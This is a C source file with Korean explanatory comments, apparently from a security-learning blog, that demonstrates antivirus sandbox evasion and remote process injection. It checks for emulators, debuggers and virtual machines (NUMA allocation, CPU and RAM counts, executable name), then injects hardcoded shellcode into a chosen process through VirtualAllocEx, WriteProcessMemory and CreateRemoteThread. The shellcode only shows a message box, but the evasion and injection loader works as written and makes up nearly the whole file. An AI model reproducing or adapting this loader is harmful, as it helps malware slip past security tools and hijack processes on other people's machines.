#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

//함수포인터.  LPVOLID 타입의 WINAPI함수를 가리키는 포인터 pVirtualAllocExNuma.
//pVirtualAllocExNuma를 타입으로 변수 선언 시 WINAPI 함수의 주소를 넘겨줄 수 있음. (함수이름 = 함수주소)
typedef LPVOID(WINAPI* pVirtualAllocExNuma) (
    HANDLE         hProcess,
    LPVOID         lpAddress,
    SIZE_T         dwSize,
    DWORD          flAllocationType,
    DWORD          flProtect,
    DWORD          nndPreferred
    ); //얘네들이 멤버가 아니라 매개변수임. typedef 타입(포인터)(매개변수,매개변수,매개변수 ....)

// checkNUMA 함수: PC에서는 메모리 할당이 정상적으로 이루어지지만.. AV 에뮬레이터(VM환경)에서는 fail.
BOOL checkNUMA() {
    LPVOID mem = NULL;
    pVirtualAllocExNuma myVirtualAllocExNuma = (pVirtualAllocExNuma)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocExNuma");
    mem = myVirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
    if (mem != NULL) { // VirtualAllocExNuma() 함수 성공했을 때. 이때 mem= 할당된 영역의 메모리 베이스 주소
        return false;
    }
    else {  // VirtualAllocExNuma() 함수 호출이 실패. null
        return true;
    }
}

// checkResources 함수: 현재 RAM, core(processor)을 알아낸 후 그 수가 2보다 작으면 false 반환. 왜냐면 요즘 컴퓨터는 최소 2GB램에 2코어는 가짐.
// 즉, 램이 2GB 이하거나 코어가 2개 미만이거나 하면 가상환경으로 취급한다는 것.
BOOL checkResources() {
    SYSTEM_INFO s; //현재 컴퓨터 시스템에 대한 정보
    MEMORYSTATUSEX ms; //확장 메모리를 포함한.. 물리적 메모리와 가상 메모리의 현재 상태에 대한 정보를 포함
    DWORD procNum;
    DWORD ram;

    // check number of processors
    GetSystemInfo(&s);  //현재 시스템에 대한 정보 검색
    procNum = s.dwNumberOfProcessors; //
    if (procNum < 2) return false;

    // check RAM
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    ram = ms.ullTotalPhys / 1024 / 1024 / 1024; //실제 물리적 메모리의 크기(byte단위) / 1024 /1024 /1024
    if (ram < 2) return false;

    return true;
}


int main(int argc, char* argv[]) {

    // messageBox Custom
    unsigned char my_payload[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
        "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
        "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
        "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
        "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
        "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
        "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
        "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
        "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
        "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
        "\x4c\x8d\x85\x1d\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
        "\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
        "\xd5\x59\x6f\x75\x20\x4a\x75\x73\x74\x20\x41\x63\x74\x69"
        "\x76\x61\x74\x65\x20\x4d\x79\x20\x54\x72\x61\x70\x20\x43"
        "\x61\x72\x64\x00\x48\x49\x48\x49\x00";

    HANDLE ph;
    HANDLE rt;
    PVOID rb;

    DWORD pid;
    pid = atoi(argv[1]);

    // AV엔진에 의해 에뮬레이트된 환경에서 해당 코드 실행 시, 첫 번째 인수가 파일명(hack_2.exe)이 아니게 됨. 이것을 체크한다.
    if (strstr(argv[0], "hack_2.exe") == NULL) {
        printf("날 실행한 프로세스의 이름은 무엇인가?.. hack_2.exe은 아닌데 뭐지? :(\n");
        return -2;
    }

    // 현재 디버거와 연결되어 있는 상태인지 IsDebuggerPresent() 함수를 통해 OS에 물어보는 것.
    if (IsDebuggerPresent()) { // 해당함수는 기본적으로 PEB에서 BeingDebugged 플래그를 확인함.
        printf("나 디버거에 붙어있냐? :(\n");
        return -2;
    }

    // NUMA 메모리를 체크.
    if (checkNUMA()) {
        printf("NUMA 메모리 할당 실패 :( \n");
        return -2;
    }

    // check resources
    if (checkResources() == false) {
        printf("아무리 봐도 여긴 가상환경이야 :(\n");
        return -2;
    }

    //100MB의 메모리를 할당한 후 0으로 채운다.
    char* mem = NULL;
    mem = (char*)malloc(100000000); //void* malloc(size_t size) 

    if (mem != NULL) {
        memset(mem, 14, 100000000);
        free(mem);

        ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
        printf("PID: %i", pid);

        rb = VirtualAllocEx(ph, NULL, sizeof(my_payload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

        WriteProcessMemory(ph, rb, my_payload, sizeof(my_payload), NULL);

        rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
        CloseHandle(ph);
        return 0;
    }
}
출처: https://so106037.tistory.com/10 [열려라 뚜껑:티스토리]